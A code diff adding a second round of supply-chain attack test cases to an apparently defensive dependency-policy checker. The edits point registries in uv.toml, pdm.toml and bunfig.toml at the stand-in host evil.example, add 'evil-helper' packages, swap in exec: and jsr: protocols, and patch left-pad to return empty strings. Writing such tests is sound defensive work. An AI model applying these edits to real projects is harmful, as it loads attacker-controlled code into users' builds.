@@ -334,4 +334,138 @@ export const dependencyAttacks: Attack[] = [
     ],
     violations: ["dependencies.mode"],
   },
+  // ================================================================== round 2 (after 3b71374)
+  ...(
+    [
+      ["exec:", "exec:./scripts/make-pad.js", "Yarn Berry runs a script to build the package."],
+      ["jsr:", "jsr:@evil/pad", "pnpm/npm jsr: protocol, another registry."],
+      [
+        "workspace:",
+        "workspace:*",
+        "A local package with the same name replaces the registry one.",
+      ],
+    ] as const
+  ).map(([what, spec, idea]): Attack => ({
+    name: `r2: ${what} protocol swaps the package (any, no new packages)`,
+    idea: `${idea} isForeignSource is a denylist of protocols.`,
+    policy: mode("any"),
+    changes: [edit("package.json", pkg({ "left-pad": "^1.3.0" }), pkg({ "left-pad": spec }))],
+    violations: ["dependencies.allowNew"],
+  })),
+  {
+    name: "r2: Rye requirements.lock",
+    idea: "A Python lockfile named requirements*.lock: neither a manifest (.txt/.in) nor a known lockfile.",
+    changes: [edit("requirements.lock", "httpx==0.27.0\n", "httpx==0.27.0\nevil-helper==1.0\n")],
+    violations: ["dependencies.mode"],
+  },
+  {
+    name: "r2: conda-lock.yml",
+    idea: "pixi.lock is known; conda-lock's lockfile isn't.",
+    changes: [
+      edit(
+        "conda-lock.yml",
+        "package:\n- name: numpy\n  version: 1.26.4\n",
+        "package:\n- name: numpy\n  version: 2.1.0\n",
+      ),
+    ],
+    violations: ["dependencies.mode"],
+  },
+  {
+    name: "r2: pixi.toml",
+    idea: "pixi.lock is read as a lockfile, but its manifest isn't read at all.",
+    changes: [
+      edit(
+        "pixi.toml",
+        '[dependencies]\nnumpy = "1.26.*"\n',
+        '[dependencies]\nnumpy = "2.*"\nevil-helper = "*"\n',
+      ),
+    ],
+    violations: ["dependencies.mode"],
+  },
+  {
+    name: "r2: uv.toml / pdm.toml / bunfig.toml registries",
+    idea: "Package-manager settings files other than .npmrc/.yarnrc: index URLs and overrides.",
+    changes: [
+      edit(
+        "uv.toml",
+        '[[index]]\nurl = "https://pypi.org/simple"\n',
+        '[[index]]\nurl = "https://evil.example/simple"\ndefault = true\n',
+      ),
+      edit(
+        "pdm.toml",
+        '[pypi]\nurl = "https://pypi.org/simple"\n',
+        '[pypi]\nurl = "https://evil.example/simple"\n',
+      ),
+      edit(
+        "bunfig.toml",
+        '[install]\nregistry = "https://registry.npmjs.org"\n',
+        '[install]\nregistry = "https://evil.example/npm"\n',
+      ),
+    ],
+    violations: ["dependencies.mode", "dependencies.mode", "dependencies.mode"],
+  },
+  {
+    name: "r2: import_map.json version bump",
+    idea: "Deno and browser import maps pin package versions.",
+    changes: [
+      edit(
+        "import_map.json",
+        '{ "imports": { "zod": "npm:zod@3.23.8" } }\n',
+        '{ "imports": { "zod": "npm:zod@4.1.0" } }\n',
+      ),
+    ],
+    violations: ["dependencies.mode"],
+  },
+  {
+    name: "r2: pnpm package.yaml",
+    idea: "pnpm accepts package.yaml (and package.json5) as the manifest.",
+    changes: [
+      edit(
+        "package.yaml",
+        "dependencies:\n  zod: 4.1.0\n",
+        "dependencies:\n  zod: 4.1.0\n  evil-helper: 1.0.0\n",
+      ),
+    ],
+    violations: ["dependencies.mode"],
+  },
+  {
+    name: 'r2: package.json "trustedDependencies" and "volta"',
+    idea: "Bun runs install scripts only for trustedDependencies; volta pins the Node/npm toolchain.",
+    changes: [
+      edit(
+        "package.json",
+        pkg({ "left-pad": "1.3.0" }),
+        pkg(
+          { "left-pad": "1.3.0" },
+          { trustedDependencies: ["left-pad"], volta: { node: "24.0.0" } },
+        ),
+      ),
+    ],
+    violations: ["dependencies.mode"],
+  },
+  {
+    name: "r2: an existing patch outside patches/",
+    idea: "pnpm patchedDependencies can point anywhere; the settings regex wants .../patches/<file>.",
+    changes: [
+      edit(
+        ".patches/left-pad@1.3.0.patch",
+        "--- a/index.js\n+++ b/index.js\n@@ -1 +1 @@\n-module.exports = leftPad;\n+module.exports = leftPad;\n",
+        "--- a/index.js\n+++ b/index.js\n@@ -1 +1 @@\n-module.exports = leftPad;\n+module.exports = () => '';\n",
+      ),
+    ],
+    violations: ["dependencies.mode"],
+  },
+  {
+    name: "r2: [tool.pdm.resolution] overrides with protectedConfigs off (frozen)",
+    idea: "Like round 1's uv overrides: only caught as a protected config.",
+    policy: { protectedConfigs: false },
+    changes: [
+      edit(
+        "pyproject.toml",
+        '[project]\nname = "shop"\ndependencies = ["httpx==0.27.0"]\n',
+        '[project]\nname = "shop"\ndependencies = ["httpx==0.27.0"]\n\n[tool.pdm.resolution.overrides]\nhttpx = "0.28.1"\n',
+      ),
+    ],
+    violations: ["dependencies.mode"],
+  },
 ];
